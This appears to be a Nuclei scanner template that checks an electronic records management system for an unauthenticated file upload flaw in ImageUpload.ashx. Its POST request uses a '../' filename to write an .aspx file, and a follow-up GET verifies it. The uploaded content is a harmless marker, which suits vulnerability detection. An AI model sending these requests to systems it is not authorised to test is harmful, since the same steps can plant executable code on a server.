id: poc-yaml-edms-imageupload-ashx-anyfile-upload
info:
  name: 电子资料管理系统 ImageUpload.ashx 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 文件上传

variables:
  t1: "{{rand_base(5)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: "1"
    method: POST
    path:
      - "{{BaseURL}}/Menu/ImageManger/ImageUpload.ashx"
    headers:
      Content-Type: "multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK"
    body: |-
      ------WebKitFormBoundaryssh7UfnPpGU7BXfK
      Content-Disposition: form-data; name="isUpload"

      印章图片
      ------WebKitFormBoundaryssh7UfnPpGU7BXfK
      Content-Disposition: form-data; name="entid"

      666
      ------WebKitFormBoundaryssh7UfnPpGU7BXfK
      Content-Disposition: form-data; name="Type"

      1
      ------WebKitFormBoundaryssh7UfnPpGU7BXfK
      Content-Disposition: form-data; name="Filedata"; filename="../{{t1}}.aspx"
      Content-Type: text/plain

      {{t2}}
      ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "操作成功"
      - type: word
        part: body
        words:
          - "<"
        negative: true

  - id: "2"
    method: GET
    path:
      - "{{BaseURL}}/{{t1}}.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
